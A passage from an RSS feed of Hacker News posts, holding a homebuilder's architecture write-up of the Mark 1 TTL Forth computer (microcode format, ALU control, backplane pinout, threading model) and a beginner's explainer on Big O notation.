<![CDATA[Mark 1 Homebuilt Forth Computer (TTL only, no microprocessor)]]>
            </title>
            <description>
<![CDATA[
Score 107 | Comments 37 (<a href="https://news.ycombinator.com/item?id=25803748">thread link</a>) | @peter_d_sherman
<br/>
January 16, 2021 | http://www.aholme.co.uk/Mk1/Architecture.htm | <a href="https://web.archive.org/web/*/http://www.aholme.co.uk/Mk1/Architecture.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<table>
<tbody><tr>
<td><b>Architecture</b></td>
<td><a href="http://www.aholme.co.uk/Mk1/Photos.htm">Photos</a></td>
<td><a href="http://www.aholme.co.uk/Mk1/Schematics.htm">Schematics</a></td>
<td><a href="#More">More homemade computers</a></td>
<td><a href="http://www.aholme.co.uk/Projects.htm">Back to projects</a></td>
</tr>
</tbody></table>
<hr>
This computer has no microprocessor.  The CPU is discrete TTL logic.
<p><img alt="Mark 1 FORTH Computer" src="http://www.aholme.co.uk/Mk1/IMG/Rack1_40.jpg" width="900" height="500">
</p><p>I bought my first TTL data book in 1979.
I was learning 6502 machine code at the time and dreamt of building a simple TTL CPU.
I sketched some circuit ideas; but that was as far as it went.
Now, 25 years later, I've finally done it!
Working evenings and weekends, the Mark 1 took a month to design, 4 months to build and a month to program.
Here's the result:</p><p>
<img alt="Recursive factorial demo" src="http://www.aholme.co.uk/Mk1/IMG/Factorial.gif" width="652" height="331">
</p><p>
<b><tt>Myself</tt></b> is a standard way to implement recursion in FORTH.
Even if you're not familiar with FORTH, if I tell you it's a stack-based language, and uses reverse polish notation (RPN), you might be able to figure out how this works.
</p><h3>Specification</h3>
<table>
<tbody><tr><td>Technology</td><td>TTL (HCMOS)</td></tr>
<tr><td>Clock</td><td>1 MHz</td></tr>
<tr><td>Data Bus</td><td>8-Bit</td></tr>
<tr><td>Address Bus</td><td>16-Bit</td></tr>
<tr><td>Software</td><td><a href="http://www.aholme.co.uk/FORTH.htm">fig-FORTH</a></td></tr>
</tbody></table>

<h3>System Overview</h3>
<p><img width="800" height="523" src="http://www.aholme.co.uk/Mk1/IMG/System.gif" alt="Block diagram"></p>

<table>
 <tbody><tr>
  <td>Module</td>
  <td>Width<br>(bits)</td>
  <td>Description</td>
  <td>Comments</td>
 </tr>
 <tr>
  <td><p>ALU</p></td>
  <td><p>8</p></td>
  <td><p>Arithmetic and logic unit</p></td>
  <td><small>
	The ALU data path is a bottleneck.
	It takes four clock cycles to load the inputs, set the ALU function, and read the result.
	This is the least satisfactory aspect of the whole design.
  </small></td>
 </tr>
 <tr>
  <td><p>OP</p></td>
  <td><p>8</p></td>
  <td><p>Operand register</p></td>
  <td rowspan="2"><small>
	OP is loaded into the uppermost 8 bits of µPC.
	The lower 4 bits are reset to zero.
  </small></td>
 </tr>
 <tr>
  <td><p>µPC</p></td>
  <td><p>12</p></td>
  <td><p>Microcode program counter</p></td>
 </tr>
 <tr>
  <td><p>W</p></td>
  <td><p>16</p></td>
  <td><p>FORTH Working register</p></td>
  <td rowspan="2"><small>
	The 16-bit index registers, IP and W, support increment, decrement, and can address memory.
  </small></td>
 </tr>
 <tr>
  <td><p>IP</p></td>
  <td><p>16</p></td>
  <td><p>FORTH Instruction Pointer</p></td>
 </tr>
 <tr>
  <td><p>PSP</p></td>
  <td><p>8</p></td>
  <td><p>FORTH Parameter stack pointer</p></td>
  <td rowspan="2"><small>
	The stack pointers, RSP and PSP, are 8-bit up/down counters feeding the A1-A9 address inputs of the stack RAMs.
	The least significant address input (A0) selects the upper or lower byte.
	Logically, the stacks are 16-bits wide by 256 words deep.
	The FORTH word length is 16 bits.
  </small></td>
 </tr>
 <tr>
  <td><p>RSP</p></td>
  <td><p>8</p></td>
  <td><p>FORTH Return stack pointer</p></td>
 </tr>
 <tr>
  <td><p>Stack RAM</p></td>
  <td><p>16</p></td>
  <td><p>Dedicated stack RAM</p></td>
 </tr>
 <tr>
  <td><p>0</p></td>
  <td><p>8</p></td>
  <td><p>Force 00H on data bus</p></td>
 </tr>
</tbody></table>

<h3>µ-Instruction Format</h3>

<p>
The Mark 1 is a micro-programmed machine with a highly encoded "vertical" microcode.
The microinstruction (µ) is only 8-bits wide.
One normally thinks in terms of "horizontal" microcodes, which are wider and less encoded.
Some are very wide indeed.
The Mark 1 is more like a RISC processor.
</p>

<p>The 8-bit µ-instruction (µ) is encoded as follows:</p>


<table>
<tbody><tr>
<td></td>
<td>µ7</td>
<td>µ6</td>
<td>µ5</td>
<td>µ4</td>
<td>µ3</td>
<td>µ2</td>
<td>µ1</td>
<td>µ0</td>
</tr>
<tr>
<td>Move LSB</td>
<td>0</td>
<td>0</td>
<td colspan="3">Source</td>
<td colspan="3">Destination</td>
</tr>
<tr>
<td>Move MSB</td>
<td>0</td>
<td>1</td>
<td colspan="3">Source</td>
<td colspan="3">Destination</td>
</tr>
<tr>
<td>Decrement</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td colspan="2">Register</td>
</tr>
<tr>
<td>Disable IRQ</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>Increment</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td colspan="2">Register</td>
</tr>
<tr>
<td>Enable IRQ</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>Jump Direct (zero page)</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td colspan="4">Address</td>
</tr>
<tr>
<td>Set ALU function</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td colspan="4">Function</td>
</tr>
<tr>
<td>Jump Indirect (µPC←OP*16)</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>Conditional skip</td>
<td>1</td>
<td>1</td>
<td colspan="2">Test</td>
<td colspan="4">Distance</td>
</tr>
</tbody></table>

<p>The source and destination fields of the move instructions are coded as follows:</p>

	<table>
	<tbody><tr><td></td><td>Destination</td><td>Source</td></tr>
	<tr><td>000</td><td>W</td><td>W</td></tr>
	<tr><td>001</td><td>IP</td><td>IP</td></tr>
	<tr><td>010</td><td>TOS</td><td>TOS</td></tr>
	<tr><td>011</td><td>R</td><td>R</td></tr>
	<tr><td>100</td><td>Memory[W]</td><td>Memory[W]</td></tr>
	<tr><td>101</td><td>OP</td><td>Memory[IP]</td></tr>
	<tr><td>110</td><td>ALU input A</td><td>Zero</td></tr>
	<tr><td>111</td><td>ALU input B</td><td>ALU output</td></tr>
	</tbody></table>

<small>TOS = Top of parameter stack; R = Top of return stack</small>

<p>The Mark 1 executes 1 µ-instruction per clock cycle (1MHz).</p>

<p>Decoding is done centrally using 74HC138 1-of-8 decoders.
Decoded control signals are distributed via the back plane.
Simple gating is then required at card level to complete the decoding.</p>

<p>The conditional is a skip not a branch.
It inhibits loading of another µ-instruction for a specified number of cycles if the test is true.
The skip distance is decremented to zero at which point normal execution resumes.</p>

<p>The "µPC←OP*16" instruction (1011xxxx) a.k.a. XOP loads the uppermost 8-bits of the program counter (µPC) from the operand register.
It's a form of indirect jump.</p>

<p>The other jump instruction (1001xxxx) has a 4-bit operand and can only reach the first 16 bytes of the µ-ROM.</p>

<p>
The 74181-based ALU requires 8 control signals.
These are decoded from the 4-bit ALU function field in the µ-instruction using a 7x16 diode matrix ROM.
The shaded squares indicate positions where diodes are fitted:</p>

<table>
 <tbody><tr>
  <td>
  </td>
  <td>
  <p>OP</p>
  </td>
  <td>
  <p>S0</p>
  </td>
  <td>
  <p>S1</p>
  </td>
  <td>
  <p>S2</p>
  </td>
  <td>
  <p>S3</p>
  </td>
  <td>
  <p>M</p>
  </td>
  <td>
  <p>FLAG</p>
  </td>
  <td>
  <p>D6</p>
  </td>
  <td>
  <p>D7</p>
  </td>
 </tr>
 <tr>
  <td>0</td>
  <td>ADD</td>
  <td>1</td>
  <td>0</td>
  <td>0</td>
  <td>1</td>
  <td>L</td>
  <td>x</td>
  <td>H</td>
  <td>H</td>
 </tr>
 <tr>
  <td>1</td>
  <td>ADC</td>
  <td>1</td>
  <td>0</td>
  <td>0</td>
  <td>1</td>
  <td>L</td>
  <td>x</td>
  <td>x</td>
  <td>L</td>
 </tr>
 <tr>
  <td>2</td>
  <td>SUB</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>0</td>
  <td>L</td>
  <td>x</td>
  <td>L</td>
  <td>H</td>
 </tr>
 <tr>
  <td>3</td>
  <td>SBB</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>0</td>
  <td>L</td>
  <td>H</td>
  <td>x</td>
  <td>L</td>
 </tr>
 <tr>
  <td>4</td>
  <td>ASL</td>
  <td>0</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>L</td>
  <td>x</td>
  <td>H</td>
  <td>H</td>
 </tr>
 <tr>
  <td>5</td>
  <td>ROL</td>
  <td>0</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>L</td>
  <td>x</td>
  <td>x</td>
  <td>L</td>
 </tr>
 <tr>
  <td>6</td>
 </tr>
 <tr>
  <td>7</td>
 </tr>
 <tr>
  <td>8 (a)</td>
  <td>0&lt;</td>
  <td>1</td>
  <td>1</td>
  <td>1</td>
  <td>1</td>
  <td>H</td>
  <td>L</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>8 (b)</td>
  <td>A</td>
  <td>1</td>
  <td>1</td>
  <td>1</td>
  <td>1</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>9</td>
  <td>B</td>
  <td>0</td>
  <td>1</td>
  <td>0</td>
  <td>1</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>10</td>
  <td>AND</td>
  <td>1</td>
  <td>1</td>
  <td>0</td>
  <td>1</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>11</td>
  <td>OR</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>1</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>12</td>
  <td>NOT</td>
  <td>0</td>
  <td>0</td>
  <td>0</td>
  <td>0</td>
  <td>H</td>
  <td>L</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>13</td>
  <td>XOR</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>0</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>14</td>
  <td>A=B</td>
  <td>1</td>
  <td>0</td>
  <td>0</td>
  <td>1</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>15</td>
 </tr>
</tbody></table>

<p>The control signals are transmitted from the diode matrix to the ALU via the data bus.</p>
<p>M is hard-wired to µ3.</p>
<p>D6 and D7 control the carry input as follows:</p>

<table>
 <tbody><tr>
  <td>D6</td>
  <td>D7</td>
  <td>Carry IN</td>
 </tr>
 <tr>
  <td>X</td>
  <td>L</td>
  <td>Previous carry OUT</td>
 </tr>
 <tr>
  <td>H</td>
  <td>H</td>
  <td>0</td>
 </tr>
 <tr>
  <td>L</td>
  <td>H</td>
  <td>1</td>
 </tr>
</tbody></table>

<p>FLAG selects sign or overflow testing.
Sign testing routes the most significant bit of the ALU result to the conditional test multiplexer.
Overflow testing required the addition of a quad-XOR gate.
The 74181 does not generate an overflow signal (the later 382 variant does).
This was not used in the end because FORTH implements signed comparison by testing the sign of the result after subtraction.</p>

<h3>Backplane</h3>

<p>The Mark 1 is housed in a 3U 19"
IEC297 sub-rack with a 64-way DIN 41612 backplane.
The bus layout is shown below.
The "A" row resembles a standard 8-bit microprocessor bus.
The "C" row carries the µ-instruction and various decoded control signals.
The fully-bussed pins (1, 2, 31, &amp; 32) carry power supply and clocks.</p>

<table>
 <tbody><tr>
  <td colspan="3"><h2>A</h2></td>
  <td colspan="4"><h2>C</h2></td>
 </tr>
 <tr>
  <td><p>1</p></td>
  <td colspan="6"><p>+5V</p></td>
 </tr>
 <tr>
  <td><p>2</p></td>
  <td colspan="6"><p>CLK1</p></td>
 </tr>
 <tr>
  <td><p>3</p></td>
  <td><p>D0</p></td>
  <td rowspan="8"><h2>DATA</h2></td>
  <td><p>3</p></td>
  <td><p>µ0</p></td>
  <td colspan="2" rowspan="8"><h2>µ</h2>
  </td>
 </tr>
 <tr>
  <td>
  <p>4</p>
  </td>
  <td>
  <p>D1</p>
  </td>
  <td>
  <p>4</p>
  </td>
  <td>
  <p>µ1</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>5</p>
  </td>
  <td>
  <p>D2</p>
  </td>
  <td>
  <p>5</p>
  </td>
  <td>
  <p>µ2</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>6</p>
  </td>
  <td>
  <p>D3</p>
  </td>
  <td>
  <p>6</p>
  </td>
  <td>
  <p>µ3</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>7</p>
  </td>
  <td>
  <p>D4</p>
  </td>
  <td>
  <p>7</p>
  </td>
  <td>
  <p>µ4</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>8</p>
  </td>
  <td>
  <p>D5</p>
  </td>
  <td>
  <p>8</p>
  </td>
  <td>
  <p>µ5</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>9</p>
  </td>
  <td>
  <p>D6</p>
  </td>
  <td>
  <p>9</p>
  </td>
  <td>
  <p>µ6</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>10</p>
  </td>
  <td>
  <p>D7</p>
  </td>
  <td>
  <p>10</p>
  </td>
  <td>
  <p>µ7</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>11</p>
  </td>
  <td>
  <p>A0</p>
  </td>
  <td rowspan="16"><h2>ADDRESS</h2></td>
  <td>
  <p>11</p>
  </td>
  <td>
  <p>µ210=101</p>
  </td>
  <td colspan="2">
  <p>Dest=OP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>12</p>
  </td>
  <td>
  <p>A1</p>
  </td>
  <td>
  <p>12</p>
  </td>
  <td>
  <p>µ210=110</p>
  </td>
  <td colspan="2">
  <p>Dest=ALU A</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>13</p>
  </td>
  <td>
  <p>A2</p>
  </td>
  <td>
  <p>13</p>
  </td>
  <td>
  <p>µ210=111</p>
  </td>
  <td colspan="2">
  <p>Dest=ALU B</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>14</p>
  </td>
  <td>
  <p>A3</p>
  </td>
  <td>
  <p>14</p>
  </td>
  <td>
  <p>µ210=000</p>
  </td>
  <td colspan="2">
  <p>W</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>15</p>
  </td>
  <td>
  <p>A4</p>
  </td>
  <td>
  <p>15</p>
  </td>
  <td>
  <p>µ210=001</p>
  </td>
  <td colspan="2">
  <p>IP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>16</p>
  </td>
  <td>
  <p>A5</p>
  </td>
  <td>
  <p>16</p>
  </td>
  <td>
  <p>µ210=010</p>
  </td>
  <td>
  <p>Dest=TOS</p>
  </td>
  <td>
  <p>PSP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>17</p>
  </td>
  <td>
  <p>A6</p>
  </td>
  <td>
  <p>17</p>
  </td>
  <td>
  <p>µ210=011</p>
  </td>
  <td>
  <p>Dest=R</p>
  </td>
  <td>
  <p>RSP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>18</p>
  </td>
  <td>
  <p>A7</p>
  </td>
  <td>
  <p>18</p>
  </td>
  <td>
  <p>SRC=111</p>
  </td>
  <td colspan="2">
  <p>ALU</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>19</p>
  </td>
  <td>
  <p>A8</p>
  </td>
  <td>
  <p>19</p>
  </td>
  <td>
  <p>SRC=000</p>
  </td>
  <td colspan="2">
  <p>W</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>20</p>
  </td>
  <td>
  <p>A9</p>
  </td>
  <td>
  <p>20</p>
  </td>
  <td>
  <p>SRC=001</p>
  </td>
  <td colspan="2">
  <p>IP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>21</p>
  </td>
  <td>
  <p>A10</p>
  </td>
  <td>
  <p>21</p>
  </td>
  <td>
  <p>SRC=010</p>
  </td>
  <td colspan="2">
  <p>TOS</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>22</p>
  </td>
  <td>
  <p>A11</p>
  </td>
  <td>
  <p>22</p>
  </td>
  <td>
  <p>SRC=011</p>
  </td>
  <td colspan="2">
  <p>R</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>23</p>
  </td>
  <td>
  <p>A12</p>
  </td>
  <td>
  <p>23</p>
  </td>
  <td>
  <p>µ=1000xxxx</p>
  </td>
  <td colspan="2">
  <p>INC / DEC</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>24</p>
  </td>
  <td>
  <p>A13</p>
  </td>
  <td>
  <p>24</p>
  </td>
  <td>
  <p>µ=1001xxxx</p>
  </td>
  <td colspan="2">
  <p>JUMP #</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>25</p>
  </td>
  <td>
  <p>A14</p>
  </td>
  <td>
  <p>25</p>
  </td>
  <td>
  <p>µ=1010xxxx</p>
  </td>
  <td colspan="2">
  <p>ALU Function</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>26</p>
  </td>
  <td>
  <p>A15</p>
  </td>
  <td>
  <p>26</p>
  </td>
  <td>
  <p>µ=1011xxxx</p>
  </td>
  <td colspan="2">
  <p>JUMP OP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>27</p>
  </td>
  <td>
  <p>MR</p>
  </td>
  <td>
  <p>Memory Read</p>
  </td>
  <td>
  <p>27</p>
  </td>
  <td>
  <p>M@IP</p>
  </td>
  <td colspan="2">
  <p>Address = IP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>28</p>
  </td>
  <td>
  <p>MW</p>
  </td>
  <td>
  <p>Memory Write</p>
  </td>
  <td>
  <p>28</p>
  </td>
  <td>
  <p>M@W</p>
  </td>
  <td colspan="2">
  <p>Address = W</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>29</p>
  </td>
  <td>
  <p>RESET</p>
  </td>
  <td>
  </td>
  <td>
  <p>29</p>
  </td>
  <td>
  <p>LO</p>
  </td>
  <td colspan="2">
  <p>LO-byte</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>30</p>
  </td>
  <td>
  <p>IRQ</p>
  </td>
  <td>
  </td>
  <td>
  <p>30</p>
  </td>
  <td>
  <p>HI</p>
  </td>
  <td colspan="2">
  <p>HI-byte</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>31</p>
  </td>
  <td colspan="6">
  <p>CLK2</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>32</p>
  </td>
  <td colspan="6">
  <p>0V</p>
  </td>
 </tr>
</tbody></table>

<p>The clocks are in quadrature.
CLK1 <strike>rises</strike>falls at the beginning of the machine cycle.
CLK2 is used to generate write-enable signals for the RAM and I/O.</p>

<p>All control signals are active low.</p>

<h3>Microcode sequencer</h3>

<p>The sequencer has a 12-bit micro-program counter (µPC).
The uppermost 8-bits can be loaded from the OP Latch, effecting a jump to one of 256 microcode routines.
Each routine starts on a 16-byte µ-page boundary.</p>

<p><img width="554" height="152" src="http://www.aholme.co.uk/Mk1/IMG/Sequencer.gif" alt="Sequencer block diagram"></p>

<p>Opcodes, the machine language of the macro-machine, are loaded into the OP latch from the data bus under
micro-program control.  They can be fetched from memory using one of the index registers as a program counter.
A simple <i>micro-interpreter</i> consists of the following 3 µ-instructions:</p>
<div><pre>OP←Memory[Index]     Load OP latch from memory
Index←Index+1        Increment "program counter"
µPC←OP*16            Execute microcode routine
</pre></div>
<p>How do these 3 µ-instructions get executed?
One possibility is to append them to the end of every µ-routine.
A slower but more space-efficient option is to append a jump to them.
Mark 1 microcode has a jump specifically for this.</p>

<h3>Virtual machine</h3>
<p>It's possible to customise the the instruction set and thereby create a "virtual machine".</p>
<p>Opcodes can have zero, one, or more operands.  
The µ-routines consume operands by incrementing the program counter.
During development, I used this two-operand POKE instruction to test the UART.
This expects a 16-bit address followed by a data byte:</p>
<div><pre>Poke:    Index.Lo ← Memory [PC]        ; Address LO
         PC ← PC+1
         Index.Hi ← Memory [PC]        ; Address HI
         PC ← PC+1
         Temp ← Memory [PC]            ; Data byte
         PC ← PC+1
         Memory [Index] ← Temp         ; Do the POKE
         Jump Next
</pre></div>
<p>The Mark 1 was designed to support the FORTH virtual machine.
The following FORTH primitives are micro-programmed:</p>

<tt>
EXIT LIT EXECUTE
BRANCH 0BRANCH (LOOP) (DO) U* U/ AND OR XOR LEAVE R&gt; &gt;R R 0= 0&lt; + D+
MINUS DMINUS OVER DROP SWAP DUP @ C@ ! C! (DOES)
</tt>

<h3>Forth model</h3>

<p>My original plan was to build a subroutine-threaded FORTH.  High-level definitions were to be called explicitly, primitives were to be compiled inline:</p>

<table>
<tbody><tr>
<td>
    <table>
    <tbody><tr><td><tt>: Foo  DUP SWAP DROP ;</tt></td></tr>
	<tr><td>&nbsp;</td></tr>
    <tr><td><tt>: Bar  OVER Foo ROT ;</tt></td></tr>
    </tbody></table>
</td>
<td>
    <table>
    <tbody><tr><td><tt>Foo:</tt></td><td><tt>DB OP_DUP, OP_SWAP, OP_DROP, OP_EXIT</tt></td></tr>
    <tr><td>&nbsp;</td></tr>
    <tr><td><tt>Bar:</tt></td><td><tt>DB OP_OVER, OP_CALL</tt></td></tr>
    <tr><td>&nbsp;</td><td><tt>DW Foo</tt></td></tr>
    <tr><td>&nbsp;</td><td><tt>DB OP_ROT, OP_EXIT</tt></td></tr>
    </tbody></table>
</td>
</tr>
</tbody></table>

<p>I abandoned this idea because most FORTHs use indirect threading and I wanted a full-featured standard FORTH with all the usual compiler facilities.
Many compiling words are tightly coupled to the indirectly threaded model.</p>

<p>Indirectly threaded code is a list of execution tokens.
An execution token is a code field address.
The code field is a pointer to machine code.
This presented a problem on the mark 1 because it has separate macro and micro address spaces.
What should go in the code field?
My solution was to shorten it to 1 byte and store the opcode:</p>

<table>
 <tbody><tr>
  <td>
  <p><br><b>Subroutine-threaded</b><br>&nbsp;</p>
  </td>
  <td>
  <p><br><b>Indirectly-threaded</b><br>&nbsp;</p>
  </td>
  <td>
  <p><br><b>Mark 1</b><br>&nbsp;</p>
  </td>
 </tr>



 <tr>
  <td>
    <pre>
 Foo:       DB OP_DUP
            DB OP_SWAP
            DB OP_DROP
            DB OP_EXIT

 Bar:       DB OP_OVER
            DB OP_CALL
            DW Foo
            DB OP_ROT
            DB OP_EXIT
	</pre>
  </td>
  <td>
    <pre>
 cfa_Foo:   DW Enter
 pfa_Foo:   DW cfa_DUP
            DW cfa_SWAP
            DW cfa_DROP
            DW cfa_Exit

 cfa_Bar:   DW Enter
 pfa_Bar:   DW cfa_OVER
            DW cfa_Foo
            DW cfa_ROT
            DW cfa_Exit

 cfa_Exit:  DW pfa_Exit
 pfa_Exit:  .. code ..

 cfa_DUP:   DW pfa_DUP
 pfa_DUP:   .. code ..
    </pre>
  </td>
  <td>
    <pre>
 cfa_Foo:   DB OP_ENTER
 pfa_Foo:   DW cfa_DUP
            DW cfa_SWAP
            DW cfa_DROP
            DW cfa_Exit

 cfa_Bar:   DB OP_ENTER
 pfa_Bar:   DW cfa_OVER
            DW cfa_Foo
            DW cfa_ROT
            DW cfa_Exit

 cfa_Exit:  DB OP_EXIT
 cfa_DUP:   DB OP_DUP
 cfa_SWAP:  DB OP_SWAP
    </pre>
  </td>
 </tr>
</tbody></table>

<p>In …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.aholme.co.uk/Mk1/Architecture.htm">http://www.aholme.co.uk/Mk1/Architecture.htm</a></em></p>]]>
            </description>
            <link>http://www.aholme.co.uk/Mk1/Architecture.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25803748</guid>
            <pubDate>Sat, 16 Jan 2021 17:35:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Big O Notation – Explained as Easily as Possible]]>
            </title>
            <description>
<![CDATA[
Score 399 | Comments 142 (<a href="https://news.ycombinator.com/item?id=25803288">thread link</a>) | @optimalsolver
<br/>
January 16, 2021 | https://thatcomputerscientist.com/big-o-notation-explained-as-easily-as-possible | <a href="https://web.archive.org/web/*/https://thatcomputerscientist.com/big-o-notation-explained-as-easily-as-possible">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1610789606012/MGgIIOjkr.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><blockquote>
<p>If you want to learn the math involved with the Big O, read  <a target="_blank" href="https://thatcomputerscientist.com/analysing-algorithms-worst-case-running-time">Analysing Algorithms: Worst Case Running Time</a>.</p>
</blockquote>
<p>Data Structures and Algorithms is about solving problems efficiently. A bad programmer solves their problems inefficiently and a really bad programmer doesn't even know why their solution is inefficient. So, the question is, <em>How do you rank an algorithm's efficiency?</em></p>
<p>The simple answer to that question is the <strong>Big O Notation</strong>. How does that work? Let me explain!</p>
<p>Say you wrote a function which goes through every number in a list and adds it to a <em>total_sum</em> variable.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610785957976/1d53AER34.png?auto=compress" alt="Screenshot 2021-01-16 at 2.02.19 PM.png"></p>
<p>If you consider "addition" to be 1 operation then running this function on a list of 10 numbers will cost 10 operations, running it on a list of 20 numbers costs 20 operations  and similarly running it on a list of n numbers costs the <em>length of list</em> (n) operations.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610786373466/WWOOmyjH9.gif?auto=format,compress&amp;gif-q=60" alt="Screen Recording 2021-01-16 at 2.01.09 PM.gif"></p>
<p>Now let's assume you wrote another function that would return the first number in a list.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610786595803/WcObNzV40.png?auto=compress" alt="Screenshot 2021-01-16 at 2.09.39 PM.png"></p>
<p>Now, no matter how large this list is, this function will never cost more than one operation. Fairly, these two algorithms have different <strong>time complexity</strong> or <em>relationship between growth of input size and growth of operations executed</em>. We communicate these time complexities using <strong><em>Big O Notation</em></strong>.</p>
<blockquote>
<p>Big O Notation is a mathematical notation used to classify algorithms according to how their run time or space requirements grow as the input size grows.</p>
</blockquote>
<p>Referring to the complexities as <em>'<strong>n</strong>'</em>, common complexities (ranked from good to bad) are:</p>
<ul>
<li>Constant - <strong>O(1)</strong></li>
<li>Logarithmic <strong>O(log n)</strong></li>
<li>Linear - <strong>O(n)</strong></li>
<li>n log n - <strong>O(n log n)</strong></li>
<li>Quadratic - <strong>O(n²)</strong></li>
<li>Exponential - <strong>O(2ⁿ)</strong></li>
<li>Factorial - <strong>O(n!)</strong></li>
</ul>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610787546688/SufUcCJVY.png?auto=compress" alt="Screenshot 2021-01-16 at 2.23.08 PM.png"></p>
<p>Our first algorithm runs in <em>O(n)</em>, meaning its operations grew in a linear relationship with the input size - in this case, the amount of numbers in the list. Our second algorithm is not dependent on the input size at all  - so it runs in constant time. 
Let's take a look at how many operations a program has to execute in function with an input size of <em>n = 5 vs n = 50</em>.</p>
<table>
<thead>
<tr>
<td></td><td>n = 5</td><td>n = 50</td></tr>
</thead>
<tbody>
<tr>
<td><strong>O(1)</strong></td><td>1</td><td>1</td></tr>
<tr>
<td><strong>O(log n)</strong></td><td>4</td><td>6</td></tr>
<tr>
<td><strong>O(n)</strong></td><td>5</td><td>50</td></tr>
<tr>
<td><strong>O(n log n)</strong></td><td>20</td><td>300</td></tr>
<tr>
<td><strong>O(n²)</strong></td><td>25</td><td>2500</td></tr>
<tr>
<td><strong>O(2ⁿ)</strong></td><td>32</td><td>1125899906842624</td></tr>
<tr>
<td><strong>O(n!)</strong></td><td>120</td><td>3.0414093e+64</td></tr>
</tbody>
</table>
<p>It might not matter when the input is small, but this gap gets very dramatic as the input size increases. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610788579877/ejJP5RkiF.gif?auto=format,compress&amp;gif-q=60" alt="Screen Recording 2021-01-16 at 2.33.46 PM.gif"></p>
<p>If n were 10000, a function that runs in <em>log(n)</em> would only take 14 operations and a function that runs in <em>n!</em> would set your computer on fire!</p>
<p>For Big O Notation, we <em>drop constants</em> so <em>O(10.n)</em> and <em>O(n/10)</em> are both equivalent to <em>O(n)</em> because the graph is still linear. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610788828910/JYXeRjI-G.png?auto=compress" alt="Screenshot 2021-01-16 at 2.47.52 PM.png"></p>
<p>Big O Notation is also used for <strong>space complexity</strong>, which works the same way - <em>how much space an algorithm uses as n grows</em> or <em>relationship between growth of input size and growth of space needed</em>.</p>
<p>So, yeah! This has been the simplest possible explanation of the Big O Notation from my side and I hope you enjoyed reading this. If you found this information helpful, share it with your friends on different social media platforms and consider clicking that <strong>follow</strong> button up there, it really motivates me to write more.</p>
